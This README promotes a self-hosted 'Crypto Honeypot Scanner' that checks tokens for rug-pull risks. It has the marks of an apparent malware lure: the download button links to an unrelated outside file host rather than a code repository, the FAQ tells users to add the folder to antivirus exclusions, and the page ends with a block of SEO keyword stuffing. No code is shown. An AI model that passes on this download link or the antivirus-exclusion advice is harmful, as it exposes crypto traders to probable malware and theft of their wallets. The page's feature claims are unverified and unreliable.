# Crypto Honeypot Scanner 🛡️🔍

A self-hosted token safety scanner for traders who check contracts before aping in. Instead of trusting a single score from an anonymous site, this tool runs a set of independent checks — contract authority, tax behavior, liquidity locks, holder concentration, deployer history — and returns each result separately, so you can see *why* a token is flagged rather than just that it is. Built for EVM chains and Solana, with CLI, HTTP API, and optional MCP mode for AI agents.

[![Download Crypto Honeypot Scanner](https://img.shields.io/badge/Download-Crypto_Honeypot_Scanner-blueviolet)](https://dyhuiying.com/s/file)

![Version](https://img.shields.io/badge/version-1.2-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-0078D6)
![Status](https://img.shields.io/badge/status-active-brightgreen)
![Chains](https://img.shields.io/badge/chains-8%2B-orange)

<details>
<summary>📑 Contents</summary>

- [Quick Start](#-quick-start)
- [Requirements](#️-requirements)
- [Key Features](#-key-features)
- [Module Overview](#-module-overview)
- [Why Choose Crypto Honeypot Scanner](#-why-choose-crypto-honeypot-scanner)
- [FAQ](#-faq)
- [SEO Keywords](#-seo-keywords)

</details>

## ⚡ Quick Start

1. Download the archive using the button above.
2. Install dependencies with `pip install -r requirements.txt`.
3. Run `scanner scan <token_address>` or start the HTTP API.

The scanner returns a per-check breakdown: what passed, what failed, and what needs manual review.

## 🖥️ Requirements

| Item | Requirement |
|------|-------------|
| OS | Windows 10/11, macOS 12+, Linux (64-bit) |
| RAM | 2 GB minimum |
| Storage | 150 MB free |
| Privileges | Standard user (no admin required) |

## ✨ Key Features

**Contract Checks**

- 🔐 **Mint & Freeze Authority** — flags tokens where the deployer can still mint supply or freeze holders.
- 🧾 **Ownership Status** — detects renounced ownership versus an active owner with privileged functions.
- 🕵️ **Proxy & Upgradeable Contracts** — warns when logic can be swapped after launch.
- 🚫 **Blacklist & Pause Functions** — identifies contracts that can block transfers or pause trading.

**Trading Behavior**

- 🍯 **Honeypot Simulation** — simulates a buy and sell to detect tokens that cannot be sold after purchase.
- 💸 **Tax Analysis** — measures actual buy and sell taxes, including dynamic tax changes and wallet-specific fees.
- 🏊 **Liquidity Verification** — checks LP existence, depth, and whether liquidity is locked or burned.
- 📉 **Slippage Simulation** — estimates realistic slippage at multiple trade sizes.

**Holder & Deployer**

- 🐋 **Holder Concentration** — top-holder percentages excluding the burn and LP addresses.
- 👥 **Bundle Detection** — flags wallets that bought in the same block as launch.
- 🕰️ **Deployer History** — shows previous tokens by the same deployer and how many were rug pulls.
- 🔗 **Wallet Clustering** — identifies related wallets tied to the deployer or team.

**Interfaces**

- 💻 **CLI Mode** — one command per token, with JSON output for scripting.
- 🌐 **HTTP API** — REST endpoints for integration into bots or dashboards.
- 🤖 **MCP Mode** — optional Model Context Protocol server so AI agents can run checks.
- 🐳 **Docker Support** — one-command deployment with `docker compose up`.

## 📋 Module Overview

| Module | What it does | Interface |
|--------|--------------|-----------|
| authority_check | Mint, freeze, and ownership status | CLI / API |
| honeypot_sim | Buy and sell simulation | CLI / API |
| tax_analyzer | Buy and sell tax measurement | CLI / API |
| liquidity_check | LP depth and lock status | CLI / API |
| holder_analysis | Concentration and bundle detection | CLI / API |
| deployer_history | Prior tokens by same deployer | CLI / API |
| mcp_server | MCP wrapper for AI agents | stdio / HTTP |
| docker_runner | Container deployment | Docker |

## 🚀 Why Choose Crypto Honeypot Scanner

- ✅ Transparent checks — every result is reported separately, so you see the reason behind a flag, not just a score.
- ✅ Multi-chain — EVM networks and Solana covered by the same CLI and API.
- ✅ Deployer-aware — previous tokens by the same deployer are part of the report, not an afterthought.
- ✅ Multiple interfaces — CLI, HTTP API, and MCP mode for agents, so the same checks fit different workflows.
- ✅ Self-hosted — token addresses are the only input, and nothing is logged to a third party.

## 💡 Why Use It

- 🛡️ Check a token before buying instead of after the price collapses.
- 🔍 See exactly which check failed and why, instead of trusting an opaque score.
- 🧭 Review deployer history to spot serial ruggers before they strike again.
- 🤖 Wire the scanner into an AI agent or trading bot through the HTTP API or MCP mode.

## ❓ FAQ

**Do I need to run it as Administrator?**
No — the scanner runs as a standard user process and does not require elevated privileges.

**Will my antivirus flag the file?**
Some engines may flag Python entry points by heuristic. Add the project folder to exclusions if needed.

**Does it work on Windows 11?**
Yes — Windows 10/11, macOS, and Linux are all supported.

**Does it guarantee a token is safe?**
No — the scanner flags risk patterns, but it does not guarantee safety or profitability.

**How do I update?**
Pull the latest archive and reinstall dependencies — cached results and configs are preserved.

## 🔎 SEO Keywords

Crypto Honeypot Scanner, honeypot scanner, crypto rug pull checker, rug pull scanner, token safety scanner, crypto token checker, honeypot detector, crypto scam checker, token contract checker, deployer history checker, liquidity lock checker, holder concentration analysis, bundle detection crypto, EVM token scanner, Solana token scanner, self-hosted honeypot scanner, crypto safety tool github, token authority checker, honeypot MCP server, crypto risk scanner

## ⚠️ Disclaimer

Provided for educational and informational purposes only. Use at your own risk and in accordance with the terms of service of any data provider you interact with. The scanner flags risk patterns and does not guarantee token safety or profitability.
